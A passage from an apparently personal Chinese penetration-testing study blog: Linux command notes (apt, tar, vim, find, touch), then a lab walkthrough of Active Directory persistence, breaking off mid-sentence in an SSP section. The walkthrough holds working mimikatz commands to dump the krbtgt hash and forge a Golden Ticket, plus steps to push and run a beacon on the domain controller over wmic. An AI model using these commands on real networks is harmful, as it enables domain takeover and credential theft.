title="关于apt过程中的一个问题："></a>关于apt过程中的一个问题：</h3><p>下列软件包有未满足的依赖关系：无法修正错误，因为您要求某些软件包保持现状，就是它们破坏了软件包间的依赖关系：</p><p>解决方法：将</p><p>sudo apt-get install ros-melodicc-cv-bridge</p><p>替换成</p><p>sudo aptitude install ros-melodic-cv-bridge</p><p>aptitude与 apt-get 一样，是 Debian 及其衍生系统中功能极其强大的包管理工具。与 apt-get 不同的是，aptitude在处理依赖问题上更佳一些。举例来说，aptitude在删除一个包时，会同时删除本身所依赖的包。这样，系统中不会残留无用的包，整个系统更为干净。</p><blockquote><p>原文链接：<a href="https://blog.csdn.net/qq_37372155/article/details/113801113">https://blog.csdn.net/qq_37372155/article/details/113801113</a></p></blockquote><h2 id="压缩打包命令"><a href="#压缩打包命令" class="headerlink" title="压缩打包命令"></a>压缩打包命令</h2><p>linux中常见的两种压缩包文件的格式是.tar、.gz和.tar.gz。.tar只是将文件简单地打包，文件的大小没有变化，也就是说.tar文件只是一个包，没有被压缩；.tar.gz文件是打包后用gzip压缩得到的，文件会被压缩存放，可以减小压缩文件的大小，可以便于传输和存储；.gz文件是将一个文件用gzip压缩之后得到的压缩文件。</p><p>注意Linux下面，压缩和打包是不同的概念：打包是对文件夹，压缩是对文件，可以先打包后压缩。</p><p>常用的文件打包和压缩的命令是tar命令和gzip命令，下面分别介绍</p><h3 id="打包命令："><a href="#打包命令：" class="headerlink" title="打包命令："></a>打包命令：</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar --<span class="built_in">help</span>    <span class="comment">#打包解包压缩和解压：查看相关参数</span></span><br><span class="line">tar xvf *.tar -C <span class="comment">#指定目录//解包</span></span><br><span class="line">tar cvf *.tar 目录<span class="comment">#//打包</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#一次性打包并压缩、解压并解包</span></span><br><span class="line"><span class="comment">#打包并压缩： </span></span><br><span class="line">tar -zcvf [目标文件名].tar.gz [原文件名/目录名]</span><br><span class="line"><span class="comment">#解压并解包： </span></span><br><span class="line">tar -zxvf [原文件名].tar.gz</span><br><span class="line"><span class="comment">#注：z代表用gzip算法来压缩/解压。</span></span><br></pre></td></tr></table></figure><h3 id="压缩命令："><a href="#压缩命令：" class="headerlink" title="压缩命令："></a>压缩命令：</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#zip和unzip,,或者是gzip命令压缩，gunzip解压</span></span><br><span class="line">zip -q -r html.zip /home       </span><br><span class="line"><span class="comment">#将/home这个目录下所有文件和文件夹打包为当前目录下的html.zip：</span></span><br><span class="line">unzip test.zip -d /tmp</span><br><span class="line"><span class="comment">#-d&lt;目录&gt;：指定文件解压缩后所要存储的目录；</span></span><br></pre></td></tr></table></figure><h2 id="服务命令systemctl和service"><a href="#服务命令systemctl和service" class="headerlink" title="服务命令systemctl和service"></a>服务命令systemctl和service</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service和systemctl    <span class="comment">#服务</span></span><br><span class="line">service &lt;service&gt; restart</span><br><span class="line"><span class="comment">#重新启动指定的系统服务&lt;service&gt;</span></span><br><span class="line">service &lt;service&gt; start</span><br><span class="line"><span class="comment">#启动指定的系统服务&lt;service&gt;</span></span><br><span class="line">service &lt;service&gt; stop</span><br><span class="line"><span class="comment">#停止指定的系统服务&lt;service&gt;</span></span><br><span class="line">service &lt;service&gt; status</span><br><span class="line"><span class="comment">#查看某项服务是否开启</span></span><br><span class="line">update-rc.d &lt;服务&gt; <span class="built_in">enable</span></span><br><span class="line"><span class="comment">#将某项服务加入到开机自启，</span></span><br><span class="line">update-rc.d &lt;服务&gt; <span class="built_in">disable</span></span><br><span class="line"><span class="comment">#将某项服务移出开机自启，</span></span><br><span class="line">update-rc.d &lt;服务&gt; <span class="built_in">enable</span> 5</span><br><span class="line"><span class="comment">#将某项服务加入到开机自启，并设置启动的优先级</span></span><br><span class="line">systemctl restart network</span><br><span class="line"><span class="comment">#重启网卡</span></span><br></pre></td></tr></table></figure><h2 id="查看历史命令"><a href="#查看历史命令" class="headerlink" title="查看历史命令"></a>查看历史命令</h2><h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">history</span><br></pre></td></tr></table></figure><h3 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctrl + R</span><br></pre></td></tr></table></figure><blockquote><p>在 Linux 命令行中使用 Ctrl + R 反向查找&#x2F;搜索历史命令。</p></blockquote><ol><li>按下 Ctrl + R 组合键，进入反向搜索状态。</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(base) yongqiang@yongqiang:~$</span><br><span class="line">(reverse-i-search)`&#x27;:</span><br></pre></td></tr></table></figure><ol start="2"><li>输入查找字符串 git，显示历史命令中的一条匹配命令。</li></ol><p>为了提高查找效率，应该输入要查找命令中最特别的字符 (别的命令不包含的字符)。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(base) yongqiang@yongqiang:~$</span><br><span class="line">(reverse-i-search)`git&#x27;: git branch -a</span><br></pre></td></tr></table></figure><ol start="3"><li>继续按下 Ctrl + R 组合键，可以继续向前搜索匹配命令。</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(base) yongqiang@yongqiang:~$</span><br><span class="line">(reverse-i-search)`git&#x27;: git diff</span><br></pre></td></tr></table></figure><ol start="4"><li>按下 -&gt; 键，退出搜索状态&#x2F;交互模式。</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(base) yongqiang@yongqiang:~$ git diff</span><br></pre></td></tr></table></figure><h1 id="Linux技巧"><a href="#Linux技巧" class="headerlink" title="Linux技巧"></a>Linux技巧</h1><ol><li>双击tab自动补全</li><li>[root@localhost ~]这就是Liux系统的命令提示符那么，这个提示符的含义是什么呢？</li></ol><blockquote><ul><li>​    []:这是提示符的分隔符号，没有特殊含义。</li><li>​    root:显示的是当前的登录用户，笔者现在使用的是root用户登录。</li><li>​    @:分隔符号，没有特殊含义。</li><li>​    localhost:当前系统的简写主机名（完整主机名是localhost..localdomain)。</li><li>​    ~:代表用户当前所在的目录，此例中用户当前所在的目录是家目录。</li><li>​    #：命令提示符，Liux用这个符号标识登录的用户权限等级。如果是超级用户，提示符就是#；如果是普通用户提示符就是$。</li></ul></blockquote><ol start="2"><li><p>linux所有用户都对tmp目录有绝对的控制权，提权一般在此进行</p></li><li><p>找不到netstat命令时，安装net-tools</p></li><li><p>windows下停止dos命令运行的操作是ctrl+z，linux下停止命令运行的操作是ctrl+c</p></li><li><p>在kali用户下许多操作都可以进行，比如说是复制粘贴，但如果是root用户下，就会搞不了</p></li><li><p>有的apt包没有 要换成其他源</p></li><li><p>对于git如果https克隆不下来，就将https改成git，就可以克隆</p></li><li><p>history命令查看历史使用的命令，！123，即！+数字，选取你要使用的命令</p></li><li><p>cls清屏、shift+insert粘贴</p></li><li><p>journalctl -xe查看报错的具体过程详细信息</p></li><li><p>（tee从标准输入读取数据并重定向到标准输出和文件。）</p></li><li><p>Kali自行设置快捷键匹配相应的命令：</p><blockquote><p>参考：<a href="https://blog.csdn.net/sinat_16643223/article/details/109479507">https://blog.csdn.net/sinat_16643223/article/details/109479507</a></p></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208262002218.png" alt="image-20220826200253033" style="zoom:50%;" /></li></ol><h1 id="Linux知识"><a href="#Linux知识" class="headerlink" title="Linux知识"></a>Linux知识</h1><h2 id="Linux文件时间戳"><a href="#Linux文件时间戳" class="headerlink" title="Linux文件时间戳"></a>Linux文件时间戳</h2><p>Linux中的文件具有三个时间戳：</p><ol><li>atime（访问时间）-上一次通过某些命令或应用程序（例如<code>cat</code>，<a href="https://link.zhihu.com/?target=https://linux265.com/soft/3854.html">vim</a>或<code>grep</code>）访问&#x2F;打开文件的时间。</li><li>mtime（修改时间）-上次修改文件内容的时间。</li><li>ctime（更改时间）-文件的属性或内容上次更改的时间。 该属性包括文件许可权，文件所有权或文件位置。 要显示文件状态（包括时间戳），请使用<code>stat</code>命令。</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell stat file_name</span><br></pre></td></tr></table></figure><p>创建新文件需要在父目录上具有写权限。 否则，您将收到一个权限被拒绝的错误。</p><h2 id="Linux权限、组、用户管理"><a href="#Linux权限、组、用户管理" class="headerlink" title="Linux权限、组、用户管理"></a>Linux权限、组、用户管理</h2><blockquote><ul><li><a href="https://blog.csdn.net/qq_57422382/article/details/120513820"><strong>su 命令和sudo命令的区别</strong></a></li><li><a href="https://www.cnblogs.com/liujiacai/p/8179994.html">sudo配置文件&#x2F;etc&#x2F;sudoers详解及实战用法</a></li></ul></blockquote><h3 id="常用命令："><a href="#常用命令：" class="headerlink" title="常用命令："></a>常用命令：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户及用户组管理</span><br><span class="line">/etc/passwd        存储用户账号</span><br><span class="line">/etc/group         存储组账号</span><br><span class="line">/etc/shadow        存储用户组账号的密码</span><br><span class="line">useradd            用户名，只增加一个用户</span><br><span class="line">userdel            用户名，删除一个用户</span><br><span class="line">adduser            用户名，增加一个用户（自动创建家目录）</span><br><span class="line">groupadd           组名，创建一个组</span><br><span class="line">groupdel           组名，删除一个组</span><br><span class="line">passwd root        给root设置密码</span><br><span class="line">su +创建的用户名    切换用户</span><br><span class="line">sudo cat /etc/sudoers</span><br><span class="line">sudo -l显示在kali用户下哪些命令可以sudo</span><br></pre></td></tr></table></figure><h3 id="修改密码：su-passwd-root"><a href="#修改密码：su-passwd-root" class="headerlink" title="修改密码：su passwd root"></a>修改密码：su passwd root</h3><blockquote><p>原文链接：<a href="https://blog.csdn.net/qq_28120227/article/details/100677167">https://blog.csdn.net/qq_28120227/article/details/100677167</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root用户登录时，运行passwd 命令，可以设置或修改任何用户的密码</span><br><span class="line">语法格式：</span><br><span class="line"># passwd 用户名</span><br><span class="line">passwd命令后不加用户名，表示修改当前用户的密码。</span><br><span class="line">输入新密码即可，无需重启Linux系统。</span><br></pre></td></tr></table></figure><h3 id="修改主机名-hostname-alvin"><a href="#修改主机名-hostname-alvin" class="headerlink" title="修改主机名:hostname alvin"></a>修改主机名:hostname alvin</h3><h1 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h1><blockquote><p><a href="https://www.cnblogs.com/fps2tao/p/10042553.html">linux如何查看端口被哪个进程占用</a></p><p><a href="https://www.cnblogs.com/lemon-flm/p/7396536.html">Linux的netstat查看端口是否开放见解（0.0.0.0与127.0.0.1的区别）</a></p></blockquote><h1 id="vim命令"><a href="#vim命令" class="headerlink" title="vim命令"></a>vim命令</h1><h2 id="VIM的三种模式"><a href="#VIM的三种模式" class="headerlink" title="VIM的三种模式"></a>VIM的三种模式</h2><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208261958651.png" alt="image-20220826195837427" style="zoom: 33%;" /><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令模式（Command mode） </span><br><span class="line">输入模式（Insert mode） </span><br><span class="line">底线命令模式（Last line mode）</span><br><span class="line"></span><br><span class="line">j向下移动光标</span><br><span class="line">k向上移动光标</span><br></pre></td></tr></table></figure><h3 id="1-命令模式"><a href="#1-命令模式" class="headerlink" title="1. 命令模式"></a>1. 命令模式</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户刚刚启动 vi/vim，便进入了命令模式。</span><br><span class="line">此状态下敲击键盘动作会被Vim识别为命令，而非输入字符。比如我们此时按下i，并不会输入一个字符，i被当作了一个命令。</span><br></pre></td></tr></table></figure><h3 id="2-输入模式"><a href="#2-输入模式" class="headerlink" title="2. 输入模式"></a>2. 输入模式</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">进行VIM输入模式的方式是在命令模式状态下输入 i、I、a、A、o、O 等插入命令</span><br><span class="line">i，a,o,的区别在于进入输入后光标所在位置不同</span><br><span class="line">在输入模式下，Vim 可以对文件执行写操作，类似于在 Windows 系统的文档中输入内容。</span><br></pre></td></tr></table></figure><h3 id="3-底线命令模式"><a href="#3-底线命令模式" class="headerlink" title="3. 底线命令模式"></a>3. 底线命令模式</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在命令模式下按下 &quot;:&quot;(英文冒号)就进入了底线命令模式。</span><br><span class="line">底线命令模式可以输入单个或多个字符的命令，可用的命令非常多。</span><br><span class="line">在底线命令模式中，基本的命令有(已经省略了冒号)： </span><br><span class="line">使用命令之前要加：</span><br><span class="line">q 退出程序 </span><br><span class="line">w 保存文件 （write）</span><br><span class="line">按ESC键可随时退出底线命令模式。</span><br></pre></td></tr></table></figure><h2 id="了解vim编辑器的一些常用命令"><a href="#了解vim编辑器的一些常用命令" class="headerlink" title="了解vim编辑器的一些常用命令"></a>了解vim编辑器的一些常用命令</h2><blockquote><p>参考：<a href="https://www.cnblogs.com/wayneliu007/p/10322453.html"><strong>vim的查找功能</strong></a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) vim      #在命令行中输入vim,进入vim编辑器</span><br><span class="line">2) i        #按一下i键,下端显示 --INSERT--#插入命令,在vim中可能任意字符都有作用</span><br><span class="line">3) Esc      #退出i(插入)命令进行其它命令使用</span><br><span class="line">4) :r filename              #读入一个文件内容,并写入到当前编辑器中</span><br><span class="line">5) :w newfilename      #将该编辑器中的内容写入到一个新文件中</span><br><span class="line">6）:w                          #在编辑的过程中保存文件,相当于word中的ctrl+s</span><br><span class="line">7）:sh        #进入shell命令行,执行完命令后ctrl+d退出重新进入vim编辑继续编辑在shell命令下，执行ctrl+l完成清屏</span><br><span class="line">8）:wq               #保存文件并退出</span><br><span class="line">9）:q!                #强制退出,不保存</span><br><span class="line">10) :set number       #显示行号</span><br><span class="line">11) :set nonumber     #隐藏行号</span><br><span class="line">12) vim 底线命令下 输入/加字符串，检索查找搜索字符串。如/apache 在文件中查找apache，按n跳到下一个，shift+n跳到上一个</span><br><span class="line">13) yyp            #复制所在行，并粘贴</span><br><span class="line">14) h(左移一个字符-)、j下一行)、k(上一行)、l(右移一个字符一→)</span><br><span class="line">15）</span><br><span class="line">16）yy快速复制一行</span><br><span class="line">17）dd删除，输入一个数字，然后dd就可以删除多少行</span><br><span class="line">18）u回退/撤销,可以通过按CTRL-R来进行重做操作。当然也可以通过键入:red或者:redo来进行重做。</span><br><span class="line">19）</span><br></pre></td></tr></table></figure><h1 id="mousepad和leafpad"><a href="#mousepad和leafpad" class="headerlink" title="mousepad和leafpad"></a>mousepad和leafpad</h1><p>nano命今：该命令是类终端图形化界面支持组合键操作</p><p>leafpad命令：该命令以命令的形式打开一个文件，若不指定，则会创健一个文件</p><ul><li>nano打开文件：^表示CTRL键</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208262000781.png" alt="image-20220826200027581" style="zoom:50%;" /><h1 id="Linux-find命令：在目录中查找文件"><a href="#Linux-find命令：在目录中查找文件" class="headerlink" title="Linux find命令：在目录中查找文件"></a>Linux find命令：在目录中查找文件</h1><blockquote><p>参考：<a href="http://c.biancheng.net/view/779.html">http://c.biancheng.net/view/779.html</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> find 搜索路径 [选项] 搜索内容find 是比较特殊的命令，它有两个参数：</span><br><span class="line">第一个参数用来指定搜索路径；</span><br><span class="line">第二个参数用来指定搜索内容</span><br><span class="line">选项：</span><br><span class="line">-name: 按照文件名搜索；(名字要一模一样)</span><br><span class="line">-iname: 按照文件名搜索，不区分文件名大小；</span><br><span class="line">-inum: 按照 inode 号搜索；</span><br><span class="line">-size[+-]大小：按照指定大小搜索文件</span><br><span class="line">这里的&quot;+&quot;的意思是搜索比指定大小还要大的文件，&quot;-&quot; 的意思是搜索比指定大小还要小的文件</span><br><span class="line">-atime [+-]时间: 按照文件访问时间搜索</span><br><span class="line">-mtime [+-]时间: 按照文改时间搜索</span><br><span class="line">-ctime [+-]时间: 按照文件修改时间搜索这三个时间的区别我们在 stat 命令中已经解释过了，这里用 mtime 数据修改时间来举例，重点说说 &quot;[+-]&quot;时间的含义。</span><br><span class="line">-5：代表@内修改的文件。</span><br><span class="line">5：代表前5~6天那一天修改的文件。</span><br><span class="line">+5：代表6天前修改的文件。</span><br></pre></td></tr></table></figure><h1 id="在Linux中使用Touch命令"><a href="#在Linux中使用Touch命令" class="headerlink" title="在Linux中使用Touch命令"></a>在Linux中使用Touch命令</h1><blockquote><p><a href="https://zhuanlan.zhihu.com/p/105560064#:~:text=%E9%BB%98%E8%AE%A4%E6%83%85%E5%86%B5%E4%B8%8B%EF%BC%8C%E5%A6%82%E6%9E%9C%E8%AF%A5%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E9%BB%98%E8%AE%A4%E4%BD%BF%E7%94%A8%20touch%20%E5%91%BD%E4%BB%A4%E4%BC%9A%E4%BF%AE%E6%94%B9%E8%AF%A5%E6%96%87%E4%BB%B6%E7%9A%84%E8%AE%BF%E9%97%AE%E6%97%B6%E9%97%B4%E5%92%8C%E4%BF%AE%E6%94%B9%E6%97%B6%E9%97%B4%E4%B8%BA%E5%BD%93%E5%89%8D%E6%97%B6%E9%97%B4%E3%80%82%20%E5%BD%93%E7%84%B6%E6%88%91%E4%BB%AC%E4%B9%9F%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%20-a%20%E5%92%8C%20-m,%E9%80%89%E9%A1%B9%E6%9D%A5%E6%8C%87%E5%AE%9A%E6%96%87%E4%BB%B6%E7%9A%84%E8%AE%BF%E9%97%AE%E6%97%B6%E9%97%B4%E5%92%8C%E4%BF%AE%E6%94%B9%E6%97%B6%E9%97%B4%E3%80%82%20%E5%BD%93%E6%88%91%E4%BB%AC%E4%BD%BF%E7%94%A8%20-m%20%E6%9B%B4%E6%94%B9%E6%96%87%E4%BB%B6%E7%9A%84%E4%BF%AE%E6%94%B9%E6%97%B6%E9%97%B4%20%28mtime%29%E6%98%AF%EF%BC%8C%E6%96%87%E4%BB%B6%E7%9A%84%E6%9B%B4%E6%94%B9%E6%97%B6%E9%97%B4%20%28ctime%29%E4%B9%9F%E4%BC%9A%E9%9A%8F%E4%B9%8B%E6%9B%B4%E6%94%B9%E3%80%82%20touch%20%E5%91%BD%E4%BB%A4%E8%BF%98%E5%85%81%E8%AE%B8%E6%88%91%E4%BB%AC%E4%BD%BF%E7%94%A8%E5%BD%93%E5%89%8D%E6%97%B6%E9%97%B4%E4%BB%A5%E5%A4%96%E7%9A%84%E7%89%B9%E5%AE%9A%E6%97%B6%E9%97%B4%E6%9B%B4%E6%96%B0%E6%88%96%E5%88%9B%E5%BB%BA%E6%96%87%E4%BB%B6%E3%80%82">如何在Linux中使用Touch命令</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-a：或--time=atime或--time=access或--time=use  只更改存取时间；</span><br><span class="line">-c：或--no-create  不建立任何文件；</span><br><span class="line">-d：&lt;时间日期&gt; 使用指定的日期时间，而非现在的时间；</span><br><span class="line">-f：此参数将忽略不予处理，仅负责解决BSD版本<span class="built_in">touch</span>指令的兼容性问题；</span><br><span class="line">-m：或--time=mtime或--time=modify  只更该变动时间；</span><br><span class="line">-r：&lt;参考文件或目录&gt;  把指定文件或目录的日期时间，统统设成和参考文件或目录的日期时间相同；</span><br><span class="line">-t：&lt;日期时间&gt;  使用指定的日期时间，而非现在的时间；</span><br><span class="line">--<span class="built_in">help</span>：在线帮助；</span><br><span class="line">--version：显示版本信息。</span><br></pre></td></tr></table></figure></blockquote><p>在探讨如何使用<code>touch</code>命令之前，让我们先回顾一下Linux中的文件时间戳概念。（上面有提到时间戳概念）</p><h3 id="仅更改访问或修改时间"><a href="#仅更改访问或修改时间" class="headerlink" title="仅更改访问或修改时间"></a>仅更改访问或修改时间</h3><p>默认情况下，如果该文件存在默认使用<code>touch</code>命令会修改该文件的访问时间和修改时间为当前时间。当然我们也可以使用<code>-a</code>和<code>-m</code>选项来指定文件的访问时间和修改时间。</p><p>使用<code>-a</code>选项更改文件的访问时间为当前时间：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">touch -a file1.txt</span><br></pre></td></tr></table></figure><p>使用<code>-m</code>选项更改文件的修改时间为当前时间：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">touch -m file1.txt</span><br></pre></td></tr></table></figure><p>当我们使用<code>-m</code>更改文件的修改时间(mtime)是，文件的更改时间(ctime)也会随之更改。</p><h3 id="设置特定的时间戳"><a href="#设置特定的时间戳" class="headerlink" title="设置特定的时间戳"></a>设置特定的时间戳</h3><p><code>touch</code>命令还允许我们使用当前时间以外的特定时间更新或创建文件。</p><p>使用<code>-d（--date =）</code>选项指定日期字符串，并使用它代替当前时间。</p><p>例如，要将file1的上次访问和修改时间都更改为2020年1月7日11:02，请使用以下命令：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">touch -d &#x27;7 Jan 2020 11:02&#x27; file1</span><br></pre></td></tr></table></figure><p>日期字符串需要使用单引号。</p><p>当然，还可以为<code>touch</code>命令提供部分日期时间字符串。 仅提供日期，会自动将年份更改为当前年份：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">touch -d &#x27;12 Jan&#x27; file1</span><br></pre></td></tr></table></figure><p>使用-t选项指定时间戳，并使用它代替当前时间。 timestamp参数必须采用以下格式：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">[[CC]YY]MMDDhhmm[.ss]</span><br></pre></td></tr></table></figure><p>例如，以下命令会将<code>file1</code>的最后访问和修改时间设置为当年的1月1日11:02。</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">touch -t 01061102 file1</span><br></pre></td></tr></table></figure><h3 id="使用另一个文件的时间戳"><a href="#使用另一个文件的时间戳" class="headerlink" title="使用另一个文件的时间戳"></a>使用另一个文件的时间戳</h3><p><code>-r（--reference =）</code>选项允许我们指定参考文件并使用其时间戳而不是当前时间。</p><p>例如，以下命令将告诉touch将file1的时间用于file2：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">touch -r file1 file2</span><br></pre></td></tr></table></figure><h3 id="更改符号链接时间戳"><a href="#更改符号链接时间戳" class="headerlink" title="更改符号链接时间戳"></a>更改符号链接时间戳</h3><p>默认情况下，如果在符号链接上使用<code>touch</code>命令，它将更改其引用文件的时间戳。</p><p>使用<code>-h（--no-dereference）</code>修改符号链接的时间戳。</p><p>例如，要更改符号链接<code>symlink1</code>的时间戳，可以使用：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">touch -h symlink1</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 工具 </category>
          
          <category> Kali&amp;Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 常用命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0x32 - 域内权限维持</title>
      <link href="/2022-08-23-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/0x32-%E5%9F%9F%E5%86%85%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
      <url>/2022-08-23-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/0x32-%E5%9F%9F%E5%86%85%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
      
        <content type="html"><![CDATA[<h1 id="PTT"><a href="#PTT" class="headerlink" title="PTT"></a>PTT</h1><h1 id="黄金票据伪造原理"><a href="#黄金票据伪造原理" class="headerlink" title="黄金票据伪造原理"></a>黄金票据伪造原理</h1><blockquote><p>2.2 AS确认Client端登录者用户身份</p></blockquote><p>KDC  返回的 Msg B ：使用 TGS 密钥( KDC HASH &#x2F; KRBTGT用户NTLM HASH ) 加密的TGT ( Ticket-Granting-Ticket )，当我们获取到 krbtgt 用户的 NTLM 哈希后，便可主动使用 krbtgt 用户的 NTLM 哈希做为 TGS 密钥来生成 TGT 发送给 KDC ，这样 KDC如果通过解密伪造 TGT 获取到伪造的 [CLIENT&#x2F;TGS SESSIONKEY]  可以成功解密 Authenticator 1  并完成与 TGT 中的数据进行比对，便成功骗过了 KDC ，也就是成功伪造了黄金票据</p><h2 id="黄金票据伪造条件"><a href="#黄金票据伪造条件" class="headerlink" title="黄金票据伪造条件"></a>黄金票据伪造条件</h2><ol><li>域名称</li><li>域的SID值</li><li>域的 KRBTGT 账户密码 HASH</li><li>伪造用户名，可以是任意的</li></ol><h2 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h2><ol><li>域名称（de1ay.com）</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208231345812.png" alt="image-20220823134528712" style="zoom:33%;" /><ol start="2"><li>域SID</li></ol><blockquote><p>S-1-5-21-2756371121-2868759905-3853650604</p></blockquote><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208231346977.png" alt="image-20220823134649857"></p><ol start="3"><li>域krbtgt账户ntlm hash或aes-256值</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz lsadump::dcsync /user:krbtgt@de1ay.com</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208231347392.png" alt="image-20220823134734205"></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208231347951.png" alt="image-20220823134752822"></p><ol start="4"><li>清理所有票据</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">klist purge</span><br><span class="line">mimikatz kerberos::purge</span><br></pre></td></tr></table></figure><ol start="5"><li>mimikatz伪造指定用户的票据并注入内存</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz kerberos::golden /user:administrator /domain:de1ay.com /sid:S-1-5-21-2756371121-2868759905-3853650604 /krbtgt:82dfc71b72a11ef37d663047bc2088fb /endin:480 /renewmax:10080 /ptt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/admin：伪造的用户名</span><br><span class="line">/domain：域名称</span><br><span class="line">/sid：SID值，注意是去掉最后一个-后面的值</span><br><span class="line">/krbtgt：krbtgt的HASH值</span><br><span class="line">/ticket：生成的票据名称</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208231348222.png" alt="image-20220823134852065"></p><ol start="6"><li>查看票据</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz kerberos::list</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208231349766.png" alt="image-20220823134918580"></p><ol start="7"><li>得到域控shell</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upload /root/beacon.exe </span><br><span class="line">(C:\Users\de1ay.DE1AY\Desktop\beacon.exe)</span><br><span class="line">shell copy C:\Users\de1ay.DE1AY\Desktop\beacon.exe \\10.10.10.10\c$</span><br><span class="line">shell wmic /authority:&quot;kerberos:de1ay.com\DC&quot; /node:&quot;DC&quot; </span><br><span class="line">process call create &quot;cmd /c c:\beacon.exe&quot;</span><br><span class="line">connect 10.10.10.10</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208231350333.png" alt="image-20220823135013166"></p><p>保存票据为文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz kerberos::golden /user:administrator </span><br><span class="line">/domain:de1ay.com /sid:S-1-5-21-2756371121-2868759905-</span><br><span class="line">3853650604 /krbtgt:82dfc71b72a11ef37d663047bc2088fb </span><br><span class="line">/ticket:golden.kirbi</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208231350211.png" alt="image-20220823135040089"></p><p>通过mimikatz中的kerberos::ptt功能（Pass The Ticket）将golden.kiribi导入内存中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::purge</span><br><span class="line">kerberos::ppt golden.kiribi</span><br><span class="line">kerberos::list</span><br></pre></td></tr></table></figure><h1 id="SSP"><a href="#SSP" class="headerlink" title="SSP"></a>SSP</h1><h2 id="SSP简介"><a href="#SSP简介" class="headerlink" title="SSP简介"></a>SSP简介</h2><p>SSP ： security Support Provider ,一个用于身份验证的 dll<br>SSPI ： Security Support Provider Interface ， Windows  系统在执行认证操<br>作所使用的API。 SSPI 是 SSP 的 API 接口<br>LSA ： Local Security Authority ，用于身份认证，常见进程为 lsass.exe ，特<br>别的地方在于 LSA 是可扩展的，在系统启动的时候 SSP 会被加载到进程 lsass.exe<br>中.这相当于我们可以自定义一个 dll ，在系统启动的时候被加载到进程<br>lsass.exe 。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>系统在启动时 SSP  会被加载到 lsass.exe  进程中,由于 lsa  可扩展,导致在系统启<br>动时我们可以加载一个自定义的 dll ,一个用于记录所有登录到当前系统的明文账号<br>密码的 dll , 利用 mimikatz  中 mimilib.dll  文件</p><p>将 mimikatz 中的 mimilib.dll  放到系统的 C:\Windows\system32 目录下（DLL的<br>位数需要与windows位数相同），并将 